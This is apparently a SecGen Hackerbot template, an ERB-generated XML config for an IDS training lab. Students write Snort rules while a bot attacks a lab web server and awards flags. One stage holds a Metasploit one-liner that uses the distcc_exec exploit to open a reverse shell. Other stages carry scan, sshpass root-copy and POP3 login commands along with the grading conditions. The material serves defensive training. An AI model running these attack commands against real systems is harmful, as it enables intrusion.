<%
  require 'json'
  require 'securerandom'
  require 'digest/sha1'
  require 'fileutils'
  require 'erb'

  if self.accounts.empty?
    abort('Sorry, you need to provide an account')
  end

  $first_account = JSON.parse(self.accounts.first)
  $second_account = JSON.parse(self.accounts[1])

  $files = []
  $log_files = []
  if $second_account.key?("leaked_filenames") &&  $second_account['leaked_filenames'].size > 0
    $files = $second_account['leaked_filenames']
    $log_files = $second_account['leaked_filenames'].grep(/log/)
  end

  if $files.empty?
    $files = ['myfile', 'afile', 'filee', 'thefile']
  end
  if $log_files.empty?
    $log_files = ['log', 'thelog', 'logs', 'frogonalog']
  end

  $main_user = $first_account['username'].to_s
  $main_user_pass = $first_account['password'].to_s
  $second_user = $second_account['username'].to_s
  $example_file = "/home/#{$second_user}/#{$files.sample}"
  $example_dir = "/home/#{$second_user}/personal_secrets/"

  $web_server_ip = self.web_server_ip.first
  $ids_server_ip = self.ids_server_ip.first
  $hackerbot_server_ip = self.hackerbot_server_ip.first
  $root_password = self.root_password
  $flags = self.flags

  REQUIRED_FLAGS = 10
  while $flags.length < REQUIRED_FLAGS
    $flags << "flag{#{SecureRandom.hex}}"
    Print.err "Warning: Not enough flags provided to hackerbot_config generator, some flags won't be tracked/marked!"
  end

  def get_binding
    binding
  end
%>
<?xml version="1.0"?>

<hackerbot
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xsi:schemaLocation="http://www.github/cliffe/SecGen/hackerbot">
<!--<hackerbot xmlns="http://www.github/cliffe/SecGen/hackerbotz"-->

	<name>Hackerbot</name>

	<AIML_chatbot_rules>config/AIML</AIML_chatbot_rules>

	<!--Method for gaining shell access, can be overwritten per-attack-->
	<!--<get_shell>bash</get_shell>-->
	<get_shell>false</get_shell>

	<messages>
		<show_attack_numbers />

		<greeting>Your web server is going to be attacked. I have inside information that will help you to monitor your network for the attacks. If you work with me I'll provide you with some flags.</greeting>

		<!--Must provide alternatives for each message-->
		<say_ready>When you are ready, simply say 'ready'.</say_ready>
		<say_ready>'Ready'?</say_ready>
		<next>Ok, I'll do what I can to move things along...</next>
		<next>Moving things along to the next one...</next>
		<previous>Ok, I'll do what I can to back things up...</previous>
		<previous>Ok, backing up.</previous>
		<goto>Ok, skipping it along.</goto>
		<goto>Let me see what I can do to goto that attack.</goto>
		<last_attack>That was the last one for now. You can rest easy, until next time... (End.)</last_attack>
		<last_attack>That was the last one. Game over?</last_attack>
		<first_attack>You are back to the beginning!</first_attack>
		<first_attack>This is where it all began.</first_attack>
		<getting_shell>Doing my thing...</getting_shell>
		<getting_shell>Here we go...</getting_shell>
		<got_shell>...</got_shell>
		<got_shell>....</got_shell>
		<repeat>Let me know when you are 'ready', if you want to move on say 'next', or 'previous' and I'll move things along.</repeat>
		<repeat>Say 'ready', 'next', or 'previous'.</repeat>

		<!--Single responses:-->
		<help>I am waiting for you to say 'ready', 'next', 'previous', 'list', 'goto *X*', or 'answer *X*'</help>
		<say_answer>Say "The answer is *X*".</say_answer>
		<no_quiz>There is no question to answer</no_quiz>
		<correct_answer>Correct</correct_answer>
		<incorrect_answer>Incorrect</incorrect_answer>
		<invalid>That's not possible.</invalid>
		<non_answer>Wouldn't you like to know.</non_answer>

		<!--can be overwritten per-attack-->
		<shell_fail_message>Oh no. Failed to get shell... You need to let us in.</shell_fail_message>
	</messages>

	<tutorial_info>
		<title>IDS: Writing rules</title>
		<tutorial><%= ERB.new(File.read self.templates_path + 'intro.md.erb').result(self.get_binding) %></tutorial>
		<footer>
<%= File.read self.templates_path + 'resources.md.erb' %>

<%= File.read self.templates_path + 'license.md.erb' %>

Randomised instance generated by [SecGen](http://github.com/cliffe/SecGen) (<%= Time.new.to_s %>)
		</footer>

		<provide_tutorial>true</provide_tutorial>

	</tutorial_info>

	<attack>
		<get_shell>msfconsole -x "use exploit/unix/misc/distcc_exec; set RHOST <%= $web_server_ip %>; set payload cmd/unix/reverse; set LHOST <%= $hackerbot_server_ip %>; exploit"</get_shell>
		<post_command>whoami > /dev/null; echo "<%= $flags.pop %>" > /dev/null; echo 'Find the flag! (in the network traffic)'</post_command>

		<prompt>Your webserver is about to be scanned/attacked. Use Tcpdump and/or Wireshark to view the behaviour of the attacker. There is a flag to be found over the wire. </prompt>

		<condition>
			<output_matches>Find the flag</output_matches>
			<message>Hope you caught that.</message>
			<trigger_next_attack />
		</condition>
		<condition>
			<output_matches>1</output_matches>
			<message>:( Failed to contact the web server (<%= $web_server_ip %>)</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<tutorial><%= ERB.new(File.read self.templates_path + 'write_snort_rules.md.erb').result(self.get_binding) %></tutorial>
	</attack>

	<attack>
<% $rand_port = rand(65535)
   $rand_alert1 = SecureRandom.hex(3) %>
		<pre_shell>sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_before; stat1=$?; nmap -sT -p <%= $rand_port - 1 %>-<%= $rand_port + 1 %> <%= $web_server_ip %> > /dev/null; stat2=$?; sleep 2; sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_after; stat3=$?; echo --$stat1$stat2$stat3; diff -n /tmp/snort_alert_before /tmp/snort_alert_after | tail -n 5</pre_shell>
		<get_shell>false</get_shell>
		<post_command></post_command>

		<prompt>Create a Snort rule that detects any TCP connection attempt to TCP port <%= $rand_port %> to <%= $web_server_ip %>. The alert must include the message "<%= $rand_alert1 %>".</prompt>

		<condition>
			<output_matches>^--1</output_matches>
			<message>:( Failed to scp to your system.</message>
		</condition>
		<condition>
			<output_matches>^--01</output_matches>
			<message>:( Failed to scan your system.</message>
		</condition>
		<condition>
			<output_matches>^--[01][01]1</output_matches>
			<message>:( Failed to scp to your system (the second time).</message>
		</condition>
		<condition>
			<output_matches>^--00.*<%= $rand_alert1 %>.*<%= $rand_alert1 %></output_matches>
			<message>:( Almost. The alert did fire, but it fired more than once!</message>
		</condition>
		<condition>
			<output_matches><%= $rand_alert1 %></output_matches>
			<message>:) Well done! <%= $flags.pop %>.</message>
			<trigger_next_attack />
		</condition>
		<else_condition>
			<message>:( Your rule didn't get triggered (or didn't include the right message).</message>
		</else_condition>
	</attack>


	<attack>
<% $rand_content1 = SecureRandom.hex(3)
   $rand_alert2 = SecureRandom.hex(3) %>
		<pre_shell>sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_before; stat1=$?; (sleep 2; echo "USER <%= $rand_content1 %>"; sleep 3; killall -9 nc ) | nc <%= $web_server_ip %> 110 > /dev/null; (sleep 2; echo "user test"; echo "pass test"; echo "stat"; echo "quit"; sleep 3; killall -9 nc ) | nc <%= $web_server_ip %> 110 > /dev/null; stat2=$?; sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_after; stat3=$?; echo --$stat1$stat2$stat3; diff -n /tmp/snort_alert_before /tmp/snort_alert_after | tail -n 5</pre_shell>
		<get_shell>false</get_shell>
		<post_command></post_command>

		<prompt>Create a Snort rule that detects any packet with the contents "<%= $rand_content1 %>" to <%= $web_server_ip %>. The alert must include the message "<%= $rand_alert2 %>".</prompt>

		<condition>
			<output_matches>^--1</output_matches>
			<message>:( Failed to scp to your system.</message>
		</condition>
		<condition>
			<output_matches>^--0.*<%= $rand_alert2 %>.*<%= $rand_alert2 %></output_matches>
			<message>:( Almost, but your rule triggered too many times. Are you inspecting the content of the connection?</message>
		</condition>
		<condition>
			<output_matches>^--0.*<%= $rand_alert2 %></output_matches>
			<message>:) Well done! <%= $flags.pop %>.</message>
			<trigger_next_attack />
		</condition>
		<else_condition>
			<message>:( Your rule didn't get triggered (or didn't include the right message).</message>
		</else_condition>
	</attack>

  <!-- 3 random services -->
<%= ERB.new(File.read self.templates_path + 'random_service_ids_rule.xml.erb').result(self.get_binding) %>
<%= ERB.new(File.read self.templates_path + 'random_service_ids_rule.xml.erb').result(self.get_binding) %>
<%= ERB.new(File.read self.templates_path + 'random_service_ids_rule.xml.erb').result(self.get_binding) %>

  <!--Email login attempt
  Tries a port scan, then connects twice once with caps, then lower, first with actual user, then incorrect creds, last 2 should trigger the rule
  -->
	<attack>
<% $rand_alert4 = SecureRandom.hex(3)
   $flag1 = $flags.pop
   $flag2 = $flags.pop
   $flag3 = $flags.pop
%>
		<pre_shell>sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_before; stat1=$?; nmap -sT -p 110 <%= $web_server_ip %> > /dev/null; (sleep 2; echo "USER <%= $main_user %>"; echo "PASS <%= $main_user_pass %>"; echo "STAT"; echo "QUIT"; sleep 3; killall -9 nc ) | nc <%= $web_server_ip %> 110; (sleep 2; echo "user test"; echo "pass test"; echo "stat"; echo "quit"; sleep 3; killall -9 nc ) | nc <%= $web_server_ip %> 110; stat2=$?; sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_after; stat3=$?; echo --$stat1$stat2$stat3; diff -n /tmp/snort_alert_before /tmp/snort_alert_after | tail -n 5</pre_shell>
		<get_shell>false</get_shell>
		<post_command></post_command>

		<prompt>Create a Snort rule that detects any unencrypted POP3 email *user authentication attempt* (someone trying to log in), to a mail server on <%= $web_server_ip %>. The alert must include the message "<%= $rand_alert4 %>". Up to three flags will be awarded, based on the quality of the rule.</prompt>

		<condition>
			<output_matches>^--1</output_matches>
			<message>:( Failed to scp to your system.</message>
		</condition>
		<condition>
			<output_matches>^--0.*<%= $rand_alert4 %>.*<%= $rand_alert4 %>.*<%= $rand_alert4 %></output_matches>
			<message>:( Almost, but your rule triggered too many times. Are you inspecting the content of the connection?</message>
		</condition>
		<condition>
			<output_matches>^--0.*<%= $rand_alert4 %>.*Classification.*User.*<%= $rand_alert4 %></output_matches>
			<message>:-D Well done! ALL THREE FLAGS!: <%= $flag1 %>, <%= $flag2 %>, <%= $flag3 %>.</message>
			<trigger_next_attack />
		</condition>
		<condition>
			<output_matches>^--0.*<%= $rand_alert4 %>.*<%= $rand_alert4 %></output_matches>
			<message>8-) Well done! Two flags: <%= $flag1 %>, <%= $flag2 %>. Could be further improved with a classification.</message>
			<trigger_next_attack />
		</condition>
		<condition>
			<output_matches>^--0.*<%= $rand_alert4 %></output_matches>
			<message>:) Well done! <%= $flag1 %>. The alert did get triggered, but it fired only under some conditions. Is your rule caps sensitive? More flags are to be had from a better rule ;-)</message>
			<trigger_next_attack />
		</condition>
		<else_condition>
			<message>:( Your rule didn't get triggered (or didn't include the right message).</message>
		</else_condition>
	</attack>

	<attack>
<% $rand_alert5 = SecureRandom.hex(3) %>
		<pre_shell>sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_before; stat1=$?; curl <%= $web_server_ip %> >/dev/null; curl <%= $web_server_ip %>/contact.html >/dev/null; stat2=$?; sleep 2; sshpass -p <%= $root_password %> scp -prv -oStrictHostKeyChecking=no root@<%= $ids_server_ip %>:/var/log/snort/alert /tmp/snort_alert_after; stat3=$?; echo --$stat1$stat2$stat3; diff -n /tmp/snort_alert_before /tmp/snort_alert_after | tail -n 15</pre_shell>
		<get_shell>false</get_shell>
		<post_command></post_command>

		<prompt>Create a Snort rule that detects access to http://<%= $web_server_ip %> but NOT http://<%= $web_server_ip %>/contact.html. The alert must include the message "<%= $rand_alert5 %>".</prompt>

		<condition>
			<output_matches>^--1</output_matches>
			<message>:( Failed to scp to your system.</message>
		</condition>
		<condition>
			<output_matches>^--01</output_matches>
			<message>:( Failed to test your system.</message>
		</condition>
		<condition>
			<output_matches>^--[01][01]1</output_matches>
			<message>:( Failed to scp to your system (the second time).</message>
		</condition>
		<condition>
			<output_matches>^--00.*<%= $rand_alert5 %>.*<%= $rand_alert5 %></output_matches>
			<message>:( Almost, but your rule triggered too many times. Are you inspecting the content of the connection?</message>
			<trigger_next_attack />
		</condition>
		<condition>
			<output_matches>^--00.*<%= $rand_alert5 %></output_matches>
			<message>:) Well done! <%= $flags.pop %>.</message>
			<trigger_next_attack />
		</condition>
		<else_condition>
			<message>:( Your rule didn't get triggered (or didn't include the right message).</message>
		</else_condition>
	</attack>

</hackerbot>
